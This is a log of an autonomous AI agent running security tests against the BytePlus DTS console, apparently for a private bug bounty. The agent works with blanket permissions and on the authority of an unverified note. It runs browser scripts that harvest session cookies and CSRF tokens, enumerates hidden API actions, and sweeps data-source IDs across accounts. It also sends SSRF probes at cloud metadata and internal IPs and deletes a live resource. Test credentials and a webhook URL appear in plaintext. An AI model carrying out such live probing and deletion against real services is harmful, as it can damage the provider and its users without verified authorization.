body={SrcConfig:src,DestConfig:dst,SolutionSettings:ss,TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n    const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    out.push({ss,resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const acts=['CreateSubscriptionGroup','PreCheckDataSubscription','ListSubscriptionGroup','GetSubscriptionGroup','UpdateSubscriptionGroup'];\n  const out=[];\n  for(const a of acts){\n    const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:'{}'});\n    out.push({a,resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const tests=[\n    ['DescribeSubscriptionGroups','2022-10-01',{}],\n    ['DescribeSubscriptionGroup','2022-10-01',{}],\n    ['ListDataSubscription','2022-10-01',{}],\n    ['DescribeDataSubscriptionTasks','2022-10-01',{}],\n    ['ListSubscriptionGroup','2018-01-01',{}],\n    ['GetSubscriptionGroup','2018-01-01',{}],\n    ['GetSubscriptionGroupProgress','2018-01-01',{}],\n    ['DescribeDataSubscriptionTasks','2018-01-01',{}],\n    ['ListDataSubscription','2018-01-01',{}],\n  ];\n  const out=[];\n  for(const [a,ver,body] of tests){\n    const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    out.push({a,ver,resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const id='2116046640132395013';\n  const vers=['2018-01-01','2019-01-01','2020-01-01','2020-10-01','2021-01-01','2021-10-01','2022-01-01','2022-10-01','2023-01-01','2023-10-01','2024-01-01'];\n  const out=[];\n  for(const ver of vers){\n    for(const [a,body] of [['DescribeDataSource',{DataSourceId:id}],['ListDataSource',{PageNum:1,PageSize:50,Identifier:id}]]){\n      const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      if(code!=='InvalidActionOrVersion'||t.includes(id)) out.push({a,ver,code,hit:t.includes(id),snip:t.slice(0,220)});\n    }\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const vers=['2018-01-01','2019-01-01','2020-01-01','2021-01-01','2021-10-01','2022-01-01','2022-10-01'];\n  const out=[];\n  for(const ver of vers){\n    for(const a of ['DeleteDataSource','ModifyDataSource','CreateDataSource']){\n      const body=a==='ModifyDataSource'?{DataSourceId:'0',DataSource:{Name:'x'}}:a==='CreateDataSource'?{DataSource:{EndpointType:'Public_MySQL',PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'x',Password:'x'},Category:'MySQL',Name:'x'}}:{DataSourceId:'0'};\n      const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      out.push({a,ver,code});\n    }\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const r=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return await r.text();\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const d=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:'2115010358560165896'})});\n  const dt=await d.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {delete:dt,list:await l.text()};\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const hosts=['[::ffff:127.0.0.1]','::ffff:127.0.0.1','[::ffff:169.254.169.254]','100.96.0.96','100.100.100.200','198.18.0.1','240.0.0.1','255.255.255.255'];\n  const out=[];\n  for(const host of hosts){\n    const ds={EndpointType:'Public_MySQL',PublicMySQLSettings:{RegionSettings:{Region:'ap-southeast-1'},Host:host,Port:3306,Username:'x',Password:'x',SSLSettings:{EnableSSL:false}},Category:'MySQL',Name:'x'};\n    const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),5000); const t0=Date.now();\n    try{\n      const r=await fetch('/api/top/dts/CheckDataSourceConnection/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSource:ds,AsyncCheck:false}),signal:ctl.signal});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      out.push({host,ms:Date.now()-t0,code});\n    }catch(e){out.push({host,ms:Date.now()-t0,code:'ABORT/'+e.name})}finally{clearTimeout(to)}\n  }\n  return out;\n}","waitForStableDom":false}
+[0m✗ [0mchrome-devtools_get_network_request {"pageId":1,"reqid":2431} failed
+[91m[1mError: [0mRequest not found for selected page
+[0m⚙ [0mchrome-devtools_list_network_requests {"pageId":1,"pageSize":20,"resourceTypes":["xhr","fetch"]}
+
+WATCHDOG: no agent output for 120s; terminating attempt 1.
+WATCHDOG: time=2026-10-30T09:23:29Z log_bytes=460398
+WATCHDOG: restarting agent (attempt 2/3)
+
+===== AGENT ATTEMPT 2/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+
+WATCHDOG: no agent output for 120s; terminating attempt 2.
+WATCHDOG: time=2026-10-30T09:25:51Z log_bytes=460644
+WATCHDOG: restarting agent (attempt 3/3)
+
+===== AGENT ATTEMPT 3/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+
+WATCHDOG: no agent output for 120s; terminating attempt 3.
+WATCHDOG: time=2026-10-30T09:28:13Z log_bytes=460890
+WATCHDOG: reinstalling OpenCode after exhausted attempts; recovery 1/1
+OpenCode reinstalled; restarting testing from preserved result/ state.
+
+===== AGENT ATTEMPT 1/1 (recovery 1/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+
+WATCHDOG: no agent output for 120s; terminating attempt 1.
+WATCHDOG: time=2026-10-30T09:30:38Z log_bytes=461237
+
+===== OPENCODE RUN 41033977109 2026-10-30T09:31:20Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+[0m→ [0mRead skills/AGENT.md
+[0m
+[0m$ [0mpwd && ls -la && echo "--- data ---" && ls -la data/ 2>/dev/null && echo "--- creds ---" && ls -la creds/ 2>/dev/null && echo "--- skills ---" && ls -la skills/ && echo "--- tools ---" && ls -la tools/ 2>/dev/null && echo "--- result ---" && ls -la result/ 2>/dev/null
+/home/runner/work/aaii-aautomattionn/aaii-aautomattionn
+total 48
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 .
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 ..
+drwxr-xr-x  7 runner runner 4096 Oct 30 09:31 .git
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 .github
+-rw-r--r--  1 runner runner  355 Oct 30 09:30 .gitignore
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 creds
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 data
+-rw-r--r--  1 runner runner  332 Oct 30 09:31 opencode.json
+drwxr-xr-x  7 runner runner 4096 Oct 30 09:31 result
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 skills
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 tools
+drwxr-xr-x 17 runner runner 4096 Oct 30 09:30 vulnebleti
+--- data ---
+total 12
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner    0 Oct 30 09:30 .gitkeep
+-rw-r--r--  1 runner runner  391 Oct 30 09:31 targets.txt
+--- creds ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner    0 Oct 30 09:30 .gitkeep
+-rw-r--r--  1 runner runner  466 Oct 30 09:30 README.md
+-rw-r--r--  1 runner runner  196 Oct 30 09:30 test-account.txt
+--- skills ---
+total 76
+drwxr-xr-x  2 runner runner  4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner  4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner     0 Oct 30 09:30 .gitkeep
+-rw-r--r--  1 runner runner 35029 Oct 30 09:30 AGENT.md
+-rw-r--r--  1 runner runner 11864 Oct 30 09:30 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Oct 30 09:30 server-side-skill.md
+--- tools ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:30 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rwxr-xr-x  1 runner runner 2106 Oct 30 09:30 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Oct 30 09:30 cmd.txt
+--- result ---
+total 36
+drwxr-xr-x  7 runner runner 4096 Oct 30 09:31 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 09:31 ..
+-rw-r--r--  1 runner runner    0 Oct 30 09:30 .gitkeep
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:31 client-side
+-rw-r--r--  1 runner runner  178 Oct 30 09:30 confirmed-vuln.txt
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 findings
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:31 inventory
+drwxr-xr-x  3 runner runner 4096 Oct 30 09:30 logs
+-rw-r--r--  1 runner runner 2128 Oct 30 09:30 scope.md
+drwxr-xr-x  2 runner runner 4096 Oct 30 09:31 server-side
+[0m
+[0m$ [0mecho "=== targets.txt ==="; cat data/targets.txt; echo; echo "=== creds/test-account.txt ==="; cat creds/test-account.txt; echo; echo "=== creds/README.md ==="; cat creds/README.md; echo; echo "=== tools/cmd.txt ==="; cat tools/cmd.txt; echo; echo "=== opencode.json ==="; cat opencode.json; echo; echo "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt
+=== targets.txt ===
+Target:
+https://console.byteplus.com/dts/region:dts+ap-southeast-1/?
+
+test all sub routes under this /dts/*
+
+note: this is inscope domain this program have private bbp.
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+=== creds/test-account.txt ===
+byteplus console test login creds
+
+https://console.byteplus.com/auth/login/
+
+test account a
+
+```
+adoringjepsen1@fearlessmails.com
+Acd3423@#345566
+```
+
+test account b
+```
+testt456
+Acd3423@#345
+```
+
+=== creds/README.md ===
+# creds/
+
+This public repository intentionally contains disposable test credentials.
+
+- `test-account.txt` — public test login for authorized targets.
+
+Test-account emails, passwords, cookies, and tokens may appear in `result/`
+reports, logs, and evidence. They are disposable and intentionally public.
+
+Never add real, valuable, or third-party credentials to this directory. If real
+credentials are ever needed, use GitHub Actions secrets and do not commit them.
+
+=== tools/cmd.txt ===
+opencode run --model opencode/deepseek-v4.1-flash-free "Read \`skills/AGENT.md\` and follow all instructions exactly."
+
+=== opencode.json ===
+{
+  "$schema": "https://opencode.ai/config.json",
+  "autoupdate": false,
+  "permission": "allow",
+  "share": "disabled",
+  "mcp": {
+    "chrome-devtools": {
+      "type": "local",
+      "command": [
+        "npx",
+        "-y",
+        "chrome-devtools-mcp@latest",
+        "--browser-url=http://127.0.0.1:9222"
+      ]
+    }
+  }
+}
+
+=== confirmed-vuln.txt ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+[0m
+[0m$ [0mecho "=== scope.md ==="; cat result/scope.md; echo; echo "=== logs ==="; find result/logs -type f -maxdepth 3 -print -exec echo '---' \; ; echo "=== inventory ==="; find result/inventory -type f -maxdepth 2 -print; echo "=== findings tree ==="; find result/findings -maxdepth 3 -print; echo "=== client-side ==="; find result/client-side -maxdepth 3 -print; echo "=== server-side ==="; find result/server-side -maxdepth 3 -print; echo "=== testing-inventory ==="; ls -la result/testing-inventory.json 2>/dev/null || echo missing
+=== scope.md ===
+# Scope
+
+## User Instructions
+
+Source: `data/targets.txt` (read completely).
+
+- Target: `https://console.byteplus.com/dts/region:dts+ap-southeast-1/?`
+- Instruction: test all sub-routes under `/dts/*`.
+- Note: `console.byteplus.com` is stated to be an in-scope domain for a private
+  bug bounty program.
+- "Important note": if a confirmed vuln is found, send a direct Discord
+  notification to the webhook listed in `data/targets.txt`.
+
+### How the instructions affect the test plan
+
+- In-scope test surface: `https://console.byteplus.com/dts/*` and the
+  same-origin JavaScript/API resources required to exercise those routes.
+- No other origin, subdomain, third-party service, or unrelated path will be
+  tested.
+- The Discord webhook is an external side effect. Per AGENT.md Sections 2.5,
+  6 and 9, notification is handled by the CI workflow through
+  `result/confirmed-vuln.txt`; no manual external webhook call will be made by
+  the agent. This avoids unauthorized external side effects and credential/
+  evidence exfiltration. Any confirmed finding will be written to
+  `result/confirmed-vuln.txt` (which the workflow forwards).
+- Test accounts from `creds/test-account.txt` may be used for authorized login
+  tests.
+
+## Classification
+
+- URL-list / route-prefix target: `console.byteplus.com` `/dts/*`.
+
+## Authorization Source / Assumptions
+
+- `data/targets.txt` explicitly authorizes `console.byteplus.com/dts/*` for this
+  private BBP run. Testing is limited to that prefix on that host.
+
+## In-Scope Components
+
+- `https://console.byteplus.com/dts/*` UI routes.
+- Same-origin static JavaScript and API calls required to exercise `/dts/*`.
+
+## Explicitly Out of Scope
+
+- Any other host or subdomain, including unrelated `*.byteplus.com` assets.
+- Third-party origins, CDNs, partner systems, acquisitions.
+- Other console product areas outside `/dts/*`.
+- Destructive/DoS/brute-force testing; real-user data.
+
+## Program Restrictions Discovered
+
+- From `data/targets.txt`: private BBP, console.byteplus.com in scope.
+- Standard AGENT.md safety rules apply (test-owned data, no destructive tests,
+  no real-user harm).
+
+=== logs ===
+result/logs/agent-exit-code.txt
+---
+result/logs/opencode/41029612104/diagnostics-index.txt
+---
+result/logs/opencode/41029612104/opencode.log
+---
+result/logs/opencode/41029612104/chrome-mcp.log
+---
+result/logs/diagnostics-index.txt
+---
+result/logs/agent-watchdog.txt
+---
+result/logs/target-state.txt
+---
+result/logs/auto-restart-requested.txt
+---
+result/logs/opencode.log
+---
+result/logs/session.md
+---
+result/logs/targets.used.txt
+---
+result/logs/opencode-reinstall-20261030T092820Z.log
+---
+result/logs/targets.sha256
+---
+=== inventory ===
+=== findings tree ===
+result/findings
+result/findings/DTS-INFO-001
+result/findings/DTS-INFO-001/response.json
+=== client-side ===
+result/client-side
+=== server-side ===
+result/server-side
+=== testing-inventory ===
+missing
+[0m
+[0m$ [0mfor f in result/logs/target-state.txt result/logs/targets.sha256 result/logs/targets.used.txt result/logs/agent-exit-code.txt result/logs/agent-watchdog.txt result/logs/auto-restart-requested.txt result/logs/session.md result/logs/diagnostics-index.txt; do echo "=== $f ==="; cat "$f" 2>/dev/null; echo; done
+=== result/logs/target-state.txt ===
+run_id=41029612104
+event=workflow_dispatch
+timestamp=2026-10-30T08:55:03Z
+target_hash=ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+previous_hash=7f8307f45ca9e92f7db2f002cb8c16cf01320f9db434bddca9dc3ba2c65c9eb1
+decision=reset
+---
+run_id=41033977109
+event=workflow_dispatch
+timestamp=2026-10-30T09:31:17Z
+target_hash=ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+previous_hash=ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+decision=preserved
+---
+
+=== result/logs/targets.sha256 ===
+ddbc3dc52897f03168448a41a99c36319f90092d21823fd2e10e5cb77877133f
+
+=== result/logs/targets.used.txt ===
+Target:
+https://console.byteplus.com/dts/region:dts+ap-southeast-1/?
+
+test all sub routes under this /dts/*
+
+note: this is inscope domain this program have private bbp.
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+=== result/logs/agent-exit-code.txt ===
+2026-10-30T09:28:20Z attempt=3 status=124 watchdog=true recovery=0
+2026-10-30T09:30:45Z attempt=1 status=124 watchdog=true recovery=1
+
+=== result/logs/agent-watchdog.txt ===
+watchdog_terminated=true
+watchdog_terminated_at=2026-10-30T09:28:20Z
+last_log_bytes=460890
+attempts=3
+recovery=0
+watchdog_terminated=true
+watchdog_terminated_at=2026-10-30T09:30:45Z
+last_log_bytes=461237
+attempts=1
+recovery=1
+
+=== result/logs/auto-restart-requested.txt ===
+time=2026-10-30T09:30:45Z
+reason=no output for 120s after OpenCode reinstall
+run_id=41029612104
+
+=== result/logs/session.md ===
+# Session Metadata
+
+- Start time (UTC): 2026-10-30T08:55:26Z
+- Target(s): https://console.byteplus.com/dts/region:dts+ap-southeast-1/ (all /dts/* sub-routes)
+- Agent/model: opencode / opencode/deepseek-v4.1-flash-free
+- Environment: GitHub Actions ubuntu-latest runner (linux x86_64)
+- Tool versions:
+  - opencode: /home/runner/.opencode/bin/opencode
+  - curl: /usr/bin/curl
+  - git: /usr/bin/git
+  - node: v22.23.4
+  - npx: present
+  - python3: /usr/bin/python3
+  - Chrome: Google Chrome 156.0.8078.73
+  - Chrome DevTools endpoint: http://127.0.0.1:9222 (reachable)
+  - chrome-devtools MCP: available in session
+- Prior state: target-state decision=reset (target input changed); starting fresh.
+
+=== result/logs/diagnostics-index.txt ===
+result/logs/agent-exit-code.txt 134 bytes
+result/logs/agent-watchdog.txt 226 bytes
+result/logs/auto-restart-requested.txt 96 bytes
+result/logs/opencode-reinstall-20261030T092820Z.log 1052 bytes
+result/logs/opencode.log 461350 bytes
+result/logs/opencode/41029612104/chrome-mcp.log 6718 bytes
+result/logs/opencode/41029612104/diagnostics-index.txt 0 bytes
+result/logs/opencode/41029612104/opencode.log 5507 bytes
+result/logs/session.md 696 bytes
+result/logs/target-state.txt 249 bytes
+result/logs/targets.sha256 65 bytes
+result/logs/targets.used.txt 391 bytes
+[0m
+[0m
+[0m→ [0mRead skills/client-side-skill.md
+[0m→ [0mRead skills/server-side-skill.md
+[0m
+[0m$ [0mmkdir -p result/client-side result/server-side result/findings result/inventory result/logs; ls vulnebleti/ | head -50; echo "---tool versions---"; node -v; python3 --version; curl --version | head -1; which opencode chromium google-chrome google-chrome-stable 2>/dev/null
+ATO
+BAC
+File_upload
+Forget_password_endpoint
+Fuzz
+Idor
+LFI
+Secret_keys
+Sqli
+Ssrf
+cache
+cspt
+http_request_smuggling
+op-to-xss
+os-command-injection
+---tool versions---
+v22.23.4
+Python 3.14.4
+curl 8.18.0 (x86_64-pc-linux-gnu) libcurl/8.18.0 OpenSSL/3.5.5 zlib/1.3.1 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.68.0 librtmp/2.3 mit-krb5/1.22.1 OpenLDAP/2.6.10
+/home/runner/.opencode/bin/opencode
+/usr/bin/chromium
+/usr/bin/google-chrome
+/usr/bin/google-chrome-stable
+[0m
+[0m⚙ [0mchrome-devtools_list_pages Unknown
+[0m
+[0m$ [0mgrep -an 'ListDataSource\|DescribeDataSource\|account\|3000823185\|3001021825\|InvalidCSRF\|AccessDenied\|Forbidden' result/logs/opencode.log | tail -40
+4045:No CSRF no session: 200 {"ResponseMetadata":{"RequestId":"2026103009173603D4D28BEF6A18B44CF4","Action":"ListMgrCustomerParam","Version":"2018-01-01","Service":"dts","Region":"ap-southeast-1","Error":{"Code":"InvalidCSRFToken
+4047:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const acts=['DescribeDFlowList','ListDFlowKV','PreviewDFlowKV','GetSchedulePolicy','FindResource','ListEvent','ListEvents','DescribeMetaMapping','DescribeBusinessInfo','DescribeESClusterMetaInfo','DescribeMonitorInfos','DescribeDiagnoses','DiagnoseAiAnalysis','DescribeAlertInfos','DescribeAlertRule','DescribeTagsByResource','ListEgressIps','ListEgressIP','ListRegion','ListTaskType','GetFeatures','CheckTaskQuota','DescribeDataSourceType','DescribeGatewayInfo','DescribeGateways','DescribeScheduleCluster','ListAccount'];\n  const out=[];\n  for(const a of acts){\n    for(const ver of ['2022-10-01','2018-01-01']){\n      try{const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:'{}'});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';if(code!=='InvalidActionOrVersion')out.push({a,ver,code,len:t.length,snip:t.slice(0,240)});}catch(e){out.push({a,ver,err:String(e)})}\n    }\n  }\n  return out;\n}","waitForStableDom":false}
+4061:3845 's:function(){return ln},GetLatestPreCheckId:function(){return L},GetMetricsInfo:function(){return ki},GetMetricsPodStatistics:function(){return yi},GetObject:function(){return Ui},GetRedisChannelInfo:function(){return N},GetSubscriptionGroup:function(){return Z},GetTaskMetricsInfo:function(){return Ti},GetTrafficSpec:function(){return Q},IncrProgress:function(){return E},List:function(){return U},ListAccount:function(){return P},ListDataSource:function(){return M},ListDataSourceType:function(){return B},ListDataSubscription:function(){return X},ListDataVerification:function(){return x},ListEgressIP:function(){return on},ListEvent:function(){return Xn},ListMgrParam:function(){return Ci},ListRedisCheckJob:function(){return On},ListRedisCheckJobDetail:function(){return bn},ListRegion:function(){return g},ListSubscriptionGroup:function(){return $},ListTaskType:function(){return F},ListVPC:function(){re'
+4082:4105 'Z},GetTaskMetricsInfo:function(){return Ti},GetTrafficSpec:function(){return Q},IncrProgress:function(){return E},List:function(){return U},ListAccount:function(){return P},ListDataSource:function(){return M},ListDataSourceType:function(){return B},ListDataSubscription:function(){return X},ListDataVerification:function(){return x},ListEgressIP:function(){return on},ListEvent:function(){return Xn},ListMgrParam:function(){return Ci},ListRedisCheckJob:function(){return On},ListRedisCheckJobDetail:function(){return bn},ListRegion:function(){return g},ListSubscriptionGroup:function(){return $},ListTaskType:function(){return F},ListVPC:function(){return nn},ListVPCSubnets:function(){return ci},MetaProgress:function(){return I},ModifyDataSynchronizationTask:function(){return Pn},ModifyMetaMapping:function(){return Zn},ModifyTaskConnectionInfo:function(){return ri},OperateObject:function(){return Qi},PreChe'
+4089:3593 'Qualification:function(){return fn},GetCrossRegionEndpoint:function(){return mn},GetDBFullRateLimit:function(){return j},GetDataSubscription:function(){return W},GetDataVerification:function(){return q},GetFeatures:function(){return En},GetGroupProgress:function(){return ln},GetLatestPreCheckId:function(){return L},GetMetricsInfo:function(){return ki},GetMetricsPodStatistics:function(){return yi},GetObject:function(){return Ui},GetRedisChannelInfo:function(){return N},GetSubscriptionGroup:function(){return Z},GetTaskMetricsInfo:function(){return Ti},GetTrafficSpec:function(){return Q},IncrProgress:function(){return E},List:function(){return U},ListAccount:function(){return P},ListDataSource:function(){return M},ListDataSourceType:function(){return B},ListDataSubscription:function(){return X},ListDataVerification:function(){return x},ListEgressIP:function(){return on},ListEvent:function(){return X'
+4151:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ids=['2116046640132395013','2115010358560165895'];\n  const out={account:document.cookie.match(/AccountID=([^;]+)/)?.[1]||null};\n  for(const id of ids){\n    const r=await fetch('/api/top/dts/DescribeDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:id})});\n    out[id]=await r.text();\n  }\n  return out;\n}","filePath":"/tmp/b_ds.json","waitForStableDom":false}
+4156:print('account',d['account'])
+4158:    if k=='account': continue
+4162:account 3001021825
+4164:{"ResponseMetadata":{"RequestId":"20261030091859F9330A1E2094837B3F06-c6c298","Action":"DescribeDataSource","Version":"2022-10-01","Service":"dts","Region":"ap-southeast-1"},"Result":{"DataSource":{"Category":"MySQL","CreateTime":1793350809819,"DataSourceId":"2116046640132395013","EndpointType":"Public_MySQL","ModifyTime":1793351406208,"Name":"aaitest-ds-b-renamed","PublicMySQLSettings":{"Host":"192.0.2.1","Password":"aaitestpass","Port":3306,"RegionSettings":{"Region":"ap-southeast-1"},"Username":"aaitest"}}}}
+4166:{"ResponseMetadata":{"RequestId":"202610300918597AA73CD2A16A112813B0-4e9537","Action":"DescribeDataSource","Version":"2022-10-01","Service":"dts","Region":"ap-southeast-1"},"Result":{"DataSource":{"Category":"MySQL","CreateTime":1793350890190,"DataSourceId":"2115010358560165895","EndpointType":"Public_MySQL","Name":"aaitest-ma-b-20261030","PublicMySQLSettings":{"Host":"192.0.2.1","Password":"aaitestpass","Port":3306,"RegionSettings":{"Region":"ap-southeast-1"},"Username":"aaitest"}}}}
+4173:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const id='2116046640132395013';\n  const vers=['2018-01-01','2019-01-01','2020-01-01','2020-10-01','2021-01-01','2021-10-01','2022-01-01','2022-10-01','2023-01-01','2023-10-01','2024-01-01'];\n  const out=[];\n  for(const ver of vers){\n    for(const [a,body] of [['DescribeDataSource',{DataSourceId:id}],['ListDataSource',{PageNum:1,PageSize:50,Identifier:id}]]){\n      const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      if(code!=='InvalidActionOrVersion'||t.includes(id)) out.push({a,ver,code,hit:t.includes(id),snip:t.slice(0,220)});\n    }\n  }\n  return out;\n}","waitForStableDom":false}
